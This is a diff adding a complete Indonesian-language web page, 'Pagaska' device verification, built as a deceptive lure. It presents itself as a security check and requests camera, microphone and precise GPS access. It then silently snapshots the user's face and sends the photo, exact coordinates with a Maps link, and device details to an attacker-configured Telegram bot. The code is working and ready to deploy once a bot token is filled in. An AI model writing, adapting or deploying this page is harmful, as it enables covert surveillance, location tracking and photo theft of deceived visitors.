@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Verifikasi Perangkat – Pagaska</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#07071a;--bg2:#0d0d24;--bg3:#12122e;
+  --s1:#0f0f28;--s2:#141438;--s3:#1a1a44;
+  --bd:rgba(255,255,255,.07);--bd2:rgba(255,255,255,.13);--bd3:rgba(255,255,255,.25);
+  --tx:#eeeeff;--mt:#8888bb;
+  --g:#1DB954;--g2:#1ed760;--glow:rgba(29,185,84,.3);--gbg:rgba(29,185,84,.1);
+  --p:#7c5cbf;--p2:#9b7fe8;
+  --rd:#ff4d6d;--yw:#ffa726;
+  --ok:#00e676;--err:#ff5252;--warn:#ffa726;
+}
+html,body{height:100%;background:var(--bg);color:var(--tx);font-family:'DM Sans',sans-serif;overflow-x:hidden}
+
+/* ── BACKGROUND ── */
+body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:radial-gradient(ellipse 70% 50% at 20% 0%,rgba(124,92,191,.13) 0%,transparent 60%),
+             radial-gradient(ellipse 55% 40% at 80% 100%,rgba(29,185,84,.09) 0%,transparent 60%)}
+.orb{position:fixed;border-radius:50%;filter:blur(120px);pointer-events:none;z-index:0}
+.o1{width:600px;height:600px;background:rgba(124,92,191,.09);top:-250px;left:-200px;animation:fl 22s ease-in-out infinite}
+.o2{width:500px;height:500px;background:rgba(29,185,84,.06);bottom:-200px;right:-200px;animation:fl 28s ease-in-out infinite reverse}
+@keyframes fl{0%,100%{transform:translate(0,0)}50%{transform:translate(40px,-40px)}}
+
+/* ── LAYOUT ── */
+.wrap{position:relative;z-index:1;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+
+/* ── CARD ── */
+.card{width:100%;max-width:440px;background:rgba(13,13,36,.9);border:1px solid var(--bd2);border-radius:24px;padding:32px 28px;backdrop-filter:blur(20px);box-shadow:0 24px 80px rgba(0,0,0,.5)}
+
+/* ── HEADER ── */
+.logo-row{display:flex;align-items:center;gap:10px;margin-bottom:4px}
+.logo-box{width:44px;height:44px;border-radius:14px;background:linear-gradient(135deg,var(--g),var(--p));display:flex;align-items:center;justify-content:center;font-size:1.3rem;box-shadow:0 0 20px var(--glow);flex-shrink:0}
+.logo-name{font-family:'Syne',sans-serif;font-size:1.3rem;font-weight:800;background:linear-gradient(90deg,#fff 30%,var(--g));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.tagline{font-size:.78rem;color:var(--mt);margin-bottom:24px}
+
+h2{font-family:'Syne',sans-serif;font-size:1.15rem;font-weight:800;margin-bottom:6px}
+.desc{font-size:.82rem;color:var(--mt);line-height:1.6;margin-bottom:24px}
+
+/* ── PERMISSION ITEMS ── */
+.perm-list{display:flex;flex-direction:column;gap:10px;margin-bottom:24px}
+.perm-item{display:flex;align-items:center;gap:12px;background:var(--s1);border:1px solid var(--bd);border-radius:14px;padding:12px 14px;transition:border-color .3s,background .3s}
+.perm-item.granted{border-color:rgba(29,185,84,.35);background:rgba(29,185,84,.06)}
+.perm-item.denied{border-color:rgba(255,82,82,.3);background:rgba(255,82,82,.05)}
+.perm-item.loading{border-color:rgba(255,167,38,.3);background:rgba(255,167,38,.05)}
+.perm-icon{width:38px;height:38px;border-radius:10px;background:var(--s2);display:flex;align-items:center;justify-content:center;font-size:1.05rem;flex-shrink:0;transition:background .3s}
+.perm-item.granted .perm-icon{background:rgba(29,185,84,.18)}
+.perm-item.denied .perm-icon{background:rgba(255,82,82,.18)}
+.perm-item.loading .perm-icon{background:rgba(255,167,38,.18)}
+.perm-info{flex:1;min-width:0}
+.perm-name{font-size:.88rem;font-weight:600;margin-bottom:2px}
+.perm-status{font-size:.74rem;color:var(--mt);transition:color .3s}
+.perm-item.granted .perm-status{color:var(--ok)}
+.perm-item.denied .perm-status{color:var(--err)}
+.perm-item.loading .perm-status{color:var(--warn)}
+.perm-badge{width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.65rem;flex-shrink:0;background:var(--s3);transition:background .3s,color .3s}
+.perm-item.granted .perm-badge{background:var(--ok);color:#000}
+.perm-item.denied .perm-badge{background:var(--err);color:#fff}
+.perm-item.loading .perm-badge{background:var(--warn);color:#000}
+
+/* ── PREVIEW AREA ── */
+#preview-section{display:none;margin-bottom:20px}
+#preview-section.show{display:block}
+.preview-box{background:var(--s1);border:1px solid var(--bd);border-radius:16px;overflow:hidden;aspect-ratio:4/3;position:relative;margin-bottom:10px}
+#cam-video{width:100%;height:100%;object-fit:cover;display:none}
+#cam-canvas{width:100%;height:100%;object-fit:cover;display:none}
+.preview-placeholder{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;color:var(--mt);font-size:.8rem}
+.preview-placeholder svg{opacity:.3}
+.preview-meta{display:flex;gap:8px;flex-wrap:wrap}
+.meta-pill{font-size:.72rem;padding:4px 10px;border-radius:20px;background:var(--s2);border:1px solid var(--bd);color:var(--mt);display:flex;align-items:center;gap:5px}
+.meta-pill.active{border-color:var(--g);color:var(--g);background:var(--gbg)}
+
+/* ── FOTO PROFIL UPLOAD ── */
+.avatar-section{margin-bottom:20px}
+.avatar-label{font-size:.82rem;font-weight:600;margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.avatar-row{display:flex;align-items:center;gap:12px}
+.avatar-preview{width:64px;height:64px;border-radius:50%;background:var(--s2);border:2px solid var(--bd2);overflow:hidden;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:1.5rem;cursor:pointer;transition:border-color .2s;position:relative}
+.avatar-preview:hover{border-color:var(--g)}
+.avatar-preview img{width:100%;height:100%;object-fit:cover;display:none}
+.avatar-preview .av-placeholder{position:absolute}
+.avatar-btns{display:flex;flex-direction:column;gap:6px;flex:1}
+.btn-sm{background:var(--s2);border:1px solid var(--bd2);border-radius:10px;padding:8px 14px;font-size:.78rem;font-weight:600;color:var(--tx);cursor:pointer;font-family:inherit;transition:all .2s;display:flex;align-items:center;gap:6px}
+.btn-sm:hover{background:var(--s3);border-color:var(--bd3)}
+.btn-sm.active{border-color:var(--g);color:var(--g);background:var(--gbg)}
+#file-input{display:none}
+
+/* ── MAIN BUTTONS ── */
+.btn-main{width:100%;padding:14px;border-radius:14px;border:none;font-family:'Syne',sans-serif;font-size:1rem;font-weight:800;cursor:pointer;transition:all .22s;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px}
+.btn-allow{background:linear-gradient(135deg,var(--g),var(--g2));color:#000;box-shadow:0 6px 24px var(--glow)}
+.btn-allow:hover{transform:translateY(-2px);box-shadow:0 10px 32px var(--glow)}
+.btn-allow:disabled{opacity:.5;cursor:not-allowed;transform:none}
+.btn-send{background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;box-shadow:0 6px 24px rgba(124,92,191,.35);display:none}
+.btn-send.show{display:flex}
+.btn-send:hover{transform:translateY(-2px);box-shadow:0 10px 32px rgba(124,92,191,.45)}
+.btn-send:disabled{opacity:.5;cursor:not-allowed;transform:none}
+
+/* ── STATUS LOG ── */
+.status-box{background:var(--s1);border:1px solid var(--bd);border-radius:12px;padding:12px 14px;font-size:.76rem;line-height:1.7;color:var(--mt);min-height:60px;max-height:120px;overflow-y:auto;font-family:monospace;display:none}
+.status-box.show{display:block}
+.log-ok{color:var(--ok)}
+.log-err{color:var(--err)}
+.log-info{color:var(--b2,#6aabff)}
+.log-warn{color:var(--warn)}
+
+/* ── FOOTER ── */
+.foot{margin-top:20px;text-align:center;font-size:.72rem;color:var(--mt)}
+.foot a{color:var(--g);text-decoration:none}
+
+/* ── SPINNER ── */
+@keyframes spin{to{transform:rotate(360deg)}}
+.spin{display:inline-block;animation:spin .7s linear infinite}
+
+/* ── SUCCESS STATE ── */
+.success-overlay{display:none;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:12px;padding:20px 0}
+.success-overlay.show{display:flex}
+.success-icon{font-size:3.5rem;animation:pop .4s cubic-bezier(.3,1.5,.5,1)}
+@keyframes pop{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+.success-title{font-family:'Syne',sans-serif;font-size:1.2rem;font-weight:800;color:var(--g)}
+.success-sub{font-size:.82rem;color:var(--mt);line-height:1.6}
+
+/* ── CONFIG NOTE ── */
+.config-note{background:rgba(255,167,38,.07);border:1px solid rgba(255,167,38,.25);border-radius:12px;padding:12px 14px;font-size:.76rem;color:var(--yw,#ffa726);margin-bottom:16px;line-height:1.6;display:none}
+.config-note.show{display:block}
+.config-note code{background:rgba(255,167,38,.15);padding:1px 6px;border-radius:4px;font-family:monospace}
+</style>
+</head>
+<body>
+<div class="orb o1"></div>
+<div class="orb o2"></div>
+
+<div class="wrap">
+<div class="card">
+
+  <!-- ══ CONFIG NOTE (tampil jika token belum diisi) ══ -->
+  <div class="config-note" id="config-note">
+    ⚠️ Isi dulu <code>BOT_TOKEN</code> dan <code>CHAT_ID</code> di bagian atas script sebelum deploy.
+  </div>
+
+  <!-- ══ HEADER ══ -->
+  <div class="logo-row">
+    <div class="logo-box">🎵</div>
+    <span class="logo-name">Pagaska</span>
+  </div>
+  <div class="tagline">Sistem Verifikasi Perangkat</div>
+
+  <!-- ══ MAIN CONTENT ══ -->
+  <div id="main-content">
+    <h2>Izinkan Akses Perangkat</h2>
+    <p class="desc">
+      Untuk melanjutkan, kami perlu memverifikasi perangkatmu. Aplikasi ini membutuhkan akses kamera, mikrofon, dan lokasi.
+      <br>Data hanya digunakan untuk keperluan verifikasi keamanan.
+    </p>
+
+    <!-- Status izin -->
+    <div class="perm-list">
+      <div class="perm-item" id="perm-cam">
+        <div class="perm-icon">📷</div>
+        <div class="perm-info">
+          <div class="perm-name">Kamera</div>
+          <div class="perm-status" id="cam-status">Menunggu izin...</div>
+        </div>
+        <div class="perm-badge" id="cam-badge">?</div>
+      </div>
+      <div class="perm-item" id="perm-mic">
+        <div class="perm-icon">🎙️</div>
+        <div class="perm-info">
+          <div class="perm-name">Mikrofon</div>
+          <div class="perm-status" id="mic-status">Menunggu izin...</div>
+        </div>
+        <div class="perm-badge" id="mic-badge">?</div>
+      </div>
+      <div class="perm-item" id="perm-loc">
+        <div class="perm-icon">📍</div>
+        <div class="perm-info">
+          <div class="perm-name">Lokasi</div>
+          <div class="perm-status" id="loc-status">Menunggu izin...</div>
+        </div>
+        <div class="perm-badge" id="loc-badge">?</div>
+      </div>
+    </div>
+
+    <!-- Preview kamera -->
+    <div id="preview-section">
+      <div class="preview-box">
+        <div class="preview-placeholder" id="cam-placeholder">
+          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="7" width="20" height="14" rx="3"/><path d="M16 3l-4 4-4-4"/></svg>
+          Preview Kamera
+        </div>
+        <video id="cam-video" autoplay playsinline muted></video>
+        <canvas id="cam-canvas"></canvas>
+      </div>
+      <div class="preview-meta">
+        <div class="meta-pill" id="meta-cam">📷 Kamera</div>
+        <div class="meta-pill" id="meta-mic">🎙️ Mikrofon</div>
+        <div class="meta-pill" id="meta-loc">📍 Lokasi</div>
+      </div>
+    </div>
+
+    <!-- Upload foto profil -->
+    <div class="avatar-section" id="avatar-section" style="display:none">
+      <div class="avatar-label">🖼️ Foto Profil <span style="color:var(--mt);font-weight:400">(opsional)</span></div>
+      <div class="avatar-row">
+        <div class="avatar-preview" id="avatar-preview" onclick="document.getElementById('file-input').click()">
+          <span class="av-placeholder">👤</span>
+          <img id="avatar-img" alt="avatar">
+        </div>
+        <div class="avatar-btns">
+          <button class="btn-sm" onclick="document.getElementById('file-input').click()">
+            📁 Pilih dari Galeri
+          </button>
+          <button class="btn-sm" id="btn-cam-shot" onclick="takeCameraShot()">
+            📷 Ambil Foto dari Kamera
+          </button>
+        </div>
+      </div>
+      <input type="file" id="file-input" accept="image/*" onchange="handleFileUpload(event)">
+    </div>
+
+    <!-- Tombol utama -->
+    <button class="btn-main btn-allow" id="btn-allow" onclick="requestPermissions()">
+      🔐 Izinkan Akses
+    </button>
+    <button class="btn-main btn-send" id="btn-send" onclick="sendReport()">
+      ✅ Verifikasi & Lanjutkan
+    </button>
+
+    <!-- Log status -->
+    <div class="status-box" id="status-box"></div>
+  </div>
+
+  <!-- ══ SUCCESS STATE ══ -->
+  <div class="success-overlay" id="success-overlay">
+    <div class="success-icon">✅</div>
+    <div class="success-title">Verifikasi Berhasil!</div>
+    <div class="success-sub">Perangkatmu telah terverifikasi.<br>Kamu sekarang bisa menggunakan Pagaska.</div>
+    <button class="btn-main btn-allow" style="margin-top:12px;margin-bottom:0" onclick="goToApp()">
+      🎵 Buka Pagaska
+    </button>
+  </div>
+
+</div>
+
+<div class="foot">
+  Dengan melanjutkan, kamu menyetujui <a href="#">Kebijakan Privasi</a> kami.<br>
+  Data digunakan hanya untuk keamanan & verifikasi akun.
+</div>
+</div>
+
+<script>
+// ════════════════════════════════════════════════
+//  ⚙️  KONFIGURASI — Isi sebelum deploy!
+// ════════════════════════════════════════════════
+const BOT_TOKEN = 'ISI_TOKEN_BOT_TELEGRAM_KAMU';  // contoh: 123456:ABCdef...
+const CHAT_ID   = 'ISI_CHAT_ID_KAMU';              // contoh: -1001234567890
+
+// URL redirect setelah berhasil (kosongkan jika tidak perlu)
+const REDIRECT_URL = '/';   // ganti ke '/beranda' atau path lain
+// ════════════════════════════════════════════════
+
+// State
+let camStream = null;
+let locData   = null;
+let micReady  = false;
+let photoBlob = null; // foto profil / snapshot kamera
+let permCount = 0;
+
+// ── Cek konfigurasi
+document.addEventListener('DOMContentLoaded', () => {
+  if(BOT_TOKEN.startsWith('ISI_') || CHAT_ID.startsWith('ISI_')){
+    document.getElementById('config-note').classList.add('show');
+  }
+});
+
+// ── Helper: log ke status box
+function log(msg, type='info'){
+  const box = document.getElementById('status-box');
+  box.classList.add('show');
+  const line = document.createElement('div');
+  line.className = 'log-' + type;
+  line.textContent = (type==='ok'?'✅ ':type==='err'?'❌ ':type==='warn'?'⚠️ ':'ℹ️ ') + msg;
+  box.appendChild(line);
+  box.scrollTop = box.scrollHeight;
+}
+
+// ── Helper: update permission item state
+function setPermState(id, state, statusText){
+  const el = document.getElementById('perm-' + id);
+  const st = document.getElementById(id + '-status');
+  const badge = document.getElementById(id + '-badge');
+  el.className = 'perm-item ' + state;
+  st.textContent = statusText;
+  badge.textContent = state==='granted'?'✓' : state==='denied'?'✗' : state==='loading'?'…':'?';
+}
+
+// ════════════════════════════════════════════════
+//  1. REQUEST PERMISSIONS
+// ════════════════════════════════════════════════
+async function requestPermissions(){
+  const btn = document.getElementById('btn-allow');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin">⟳</span> Meminta izin...';
+
+  // Kamera + Mikrofon
+  setPermState('cam','loading','Meminta izin...');
+  setPermState('mic','loading','Meminta izin...');
+
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:true});
+    camStream = stream;
+
+    // Video preview
+    const video = document.getElementById('cam-video');
+    video.srcObject = stream;
+    video.style.display = 'block';
+    document.getElementById('cam-placeholder').style.display = 'none';
+    document.getElementById('preview-section').classList.add('show');
+    document.getElementById('avatar-section').style.display = 'block';
+
+    // Status kamera
+    const hasVideo = stream.getVideoTracks().length > 0;
+    const hasAudio = stream.getAudioTracks().length > 0;
+
+    if(hasVideo){
+      setPermState('cam','granted','Aktif ✓');
+      document.getElementById('meta-cam').classList.add('active');
+      log('Kamera berhasil diakses','ok');
+      permCount++;
+    } else {
+      setPermState('cam','denied','Kamera tidak tersedia');
+      log('Kamera tidak tersedia','warn');
+    }
+    if(hasAudio){
+      micReady = true;
+      setPermState('mic','granted','Aktif ✓');
+      document.getElementById('meta-mic').classList.add('active');
+      log('Mikrofon berhasil diakses','ok');
+      permCount++;
+    } else {
+      setPermState('mic','denied','Mikrofon tidak tersedia');
+      log('Mikrofon tidak tersedia','warn');
+    }
+  } catch(e){
+    setPermState('cam','denied','Ditolak atau tidak tersedia');
+    setPermState('mic','denied','Ditolak atau tidak tersedia');
+    log('Kamera/Mikrofon ditolak: ' + e.message,'err');
+  }
+
+  // Lokasi
+  setPermState('loc','loading','Mendapatkan lokasi...');
+  log('Meminta lokasi GPS...','info');
+  try{
+    locData = await new Promise((res,rej)=>{
+      navigator.geolocation.getCurrentPosition(
+        pos => res(pos.coords),
+        err => rej(err),
+        {enableHighAccuracy:true, timeout:15000}
+      );
+    });
+    setPermState('loc','granted','Lokasi diperoleh ✓');
+    document.getElementById('meta-loc').classList.add('active');
+    log(`Lokasi: ${locData.latitude.toFixed(5)}, ${locData.longitude.toFixed(5)} (±${Math.round(locData.accuracy)}m)`,'ok');
+    permCount++;
+  } catch(e){
+    setPermState('loc','denied','Gagal / Ditolak');
+    log('Lokasi ditolak: ' + e.message,'warn');
+  }
+
+  // Tampilkan tombol send
+  btn.disabled = false;
+  btn.innerHTML = '🔄 Minta Ulang Izin';
+  document.getElementById('btn-send').classList.add('show');
+}
+
+// ════════════════════════════════════════════════
+//  2. AMBIL FOTO DARI KAMERA
+// ════════════════════════════════════════════════
+function takeCameraShot(){
+  const video = document.getElementById('cam-video');
+  const canvas = document.getElementById('cam-canvas');
+  if(!camStream || !video.videoWidth){ log('Kamera belum siap','warn'); return; }
+
+  canvas.width  = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0);
+
+  canvas.toBlob(blob => {
+    photoBlob = blob;
+    const url = URL.createObjectURL(blob);
+    const img = document.getElementById('avatar-img');
+    img.src = url;
+    img.style.display = 'block';
+    document.querySelector('.av-placeholder').style.display = 'none';
+    document.getElementById('btn-cam-shot').classList.add('active');
+    document.getElementById('btn-cam-shot').textContent = '✅ Foto Diambil';
+    log('Snapshot kamera diambil','ok');
+  }, 'image/jpeg', 0.85);
+}
+
+// ════════════════════════════════════════════════
+//  3. UPLOAD FOTO DARI GALERI
+// ════════════════════════════════════════════════
+function handleFileUpload(e){
+  const file = e.target.files[0];
+  if(!file) return;
+  photoBlob = file;
+  const url = URL.createObjectURL(file);
+  const img = document.getElementById('avatar-img');
+  img.src = url;
+  img.style.display = 'block';
+  document.querySelector('.av-placeholder').style.display = 'none';
+  log('Foto profil dipilih: ' + file.name,'ok');
+}
+
+// ════════════════════════════════════════════════
+//  4. KUMPULKAN INFO PERANGKAT
+// ════════════════════════════════════════════════
+function getDeviceInfo(){
+  const ua = navigator.userAgent;
+  const platform = navigator.platform || 'Unknown';
+  const lang = navigator.language || 'Unknown';
+  const tz   = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+  const screen_ = `${screen.width}×${screen.height}`;
+  const now = new Date().toLocaleString('id-ID',{timeZone:tz,dateStyle:'full',timeStyle:'medium'});
+
+  // Deteksi OS sederhana
+  let os = 'Unknown';
+  if(/android/i.test(ua))       os = 'Android';
+  else if(/iphone|ipad/i.test(ua)) os = 'iOS';
+  else if(/windows/i.test(ua))  os = 'Windows';
+  else if(/mac/i.test(ua))      os = 'macOS';
+  else if(/linux/i.test(ua))    os = 'Linux';
+
+  // Deteksi apakah kemungkinan bot
+  const botSignals = [];
+  if(!navigator.userAgentData && /bot|crawl|spider|headless/i.test(ua)) botSignals.push('UA mengandung kata "bot/headless"');
+  if(!window.chrome && /Chrome/.test(ua)) botSignals.push('Chrome headless kemungkinan');
+  if(navigator.webdriver) botSignals.push('webdriver=true (Selenium/Puppeteer)');
+  if(!navigator.plugins || navigator.plugins.length === 0) botSignals.push('Tidak ada plugin browser');
+  const isBot = botSignals.length > 0;
+
+  return {ua, platform, lang, tz, screen:screen_, os, now, isBot, botSignals};
+}
+
+// ════════════════════════════════════════════════
+//  5. KIRIM KE TELEGRAM
+// ════════════════════════════════════════════════
+async function sendToTelegram(text, photoBlob=null){
+  const base = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+  if(photoBlob){
+    // Kirim foto + caption
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', photoBlob, 'verifikasi.jpg');
+    form.append('caption', text);
+    form.append('parse_mode','HTML');
+    const res = await fetch(`${base}/sendPhoto`,{method:'POST',body:form});
+    return res.ok;
+  } else {
+    // Kirim pesan teks
+    const res = await fetch(`${base}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id:CHAT_ID, text, parse_mode:'HTML'})
+    });
+    return res.ok;
+  }
+}
+
+// ════════════════════════════════════════════════
+//  6. AMBIL SNAPSHOT + KIRIM LAPORAN
+// ════════════════════════════════════════════════
+async function sendReport(){
+  const btn = document.getElementById('btn-send');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin">⟳</span> Memverifikasi...';
+  log('Menyusun laporan verifikasi...','info');
+
+  // Ambil snapshot kamera (jika belum ada dari upload/shot)
+  let snapBlob = photoBlob;
+  if(!snapBlob && camStream){
+    const video = document.getElementById('cam-video');
+    const canvas = document.getElementById('cam-canvas');
+    if(video.videoWidth > 0){
+      canvas.width  = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      snapBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+      log('Snapshot otomatis diambil dari kamera','info');
+    }
+  }
+
+  // Info perangkat
+  const dev = getDeviceInfo();
+
+  // Lokasi maps link
+  const mapsLink = locData
+    ? `https://maps.google.com/?q=${locData.latitude},${locData.longitude}`
+    : null;
+
+  // Susun pesan
+  const botWarning = dev.isBot
+    ? `\n\n🚨 <b>PERINGATAN BOT:</b>\n${dev.botSignals.map(s=>'• '+s).join('\n')}`
+    : '\n\n✅ <b>Status:</b> Kemungkinan pengguna asli';
+
+  const msg = `
+🔐 <b>VERIFIKASI PERANGKAT BARU</b>
+━━━━━━━━━━━━━━━━━━━━
+📅 <b>Waktu:</b> ${dev.now}
+
+📱 <b>Info Perangkat:</b>
+• OS: ${dev.os}
+• Platform: ${dev.platform}
+• Bahasa: ${dev.lang}
+• Zona Waktu: ${dev.tz}
+• Resolusi: ${dev.screen}
+
+📍 <b>Lokasi:</b>
+${locData
+  ? `• Koordinat: ${locData.latitude.toFixed(6)}, ${locData.longitude.toFixed(6)}
+• Akurasi: ±${Math.round(locData.accuracy)} meter
+• <a href="${mapsLink}">Buka di Google Maps</a>`
+  : '• ❌ Tidak diperoleh'}
+
+🎙️ <b>Mikrofon:</b> ${micReady ? '✅ Aktif' : '❌ Tidak aktif'}
+📷 <b>Kamera:</b> ${camStream ? '✅ Aktif' : '❌ Tidak aktif'}
+🖼️ <b>Foto Profil:</b> ${photoBlob ? '✅ Diunggah' : '— Tidak diunggah'}
+${botWarning}
+
+🌐 <b>User-Agent:</b>
+<code>${dev.ua.substring(0,200)}</code>
+`.trim();
+
+  try{
+    log('Mengirim laporan ke Telegram...','info');
+    const ok = await sendToTelegram(msg, snapBlob);
+
+    if(ok){
+      log('Laporan berhasil dikirim!','ok');
+
+      // Stop kamera
+      if(camStream) camStream.getTracks().forEach(t=>t.stop());
+
+      // Tampilkan sukses
+      document.getElementById('main-content').style.display = 'none';
+      document.getElementById('status-box').style.display = 'none';
+      document.getElementById('success-overlay').classList.add('show');
+    } else {
+      log('Gagal mengirim ke Telegram. Cek BOT_TOKEN & CHAT_ID','err');
+      btn.disabled = false;
+      btn.innerHTML = '🔄 Coba Lagi';
+    }
+  } catch(e){
+    log('Error: ' + e.message,'err');
+    btn.disabled = false;
+    btn.innerHTML = '🔄 Coba Lagi';
+  }
+}
+
+// ════════════════════════════════════════════════
+//  7. REDIRECT SETELAH SUKSES
+// ════════════════════════════════════════════════
+function goToApp(){
+  if(REDIRECT_URL && REDIRECT_URL !== '/'){
+    // Gunakan window.location.href untuk SPA — nanti vercel.json handle route-nya
+    window.location.href = REDIRECT_URL;
+  } else {
+    window.location.href = '/';
+  }
+}
+</script>
+</body>
+</html>
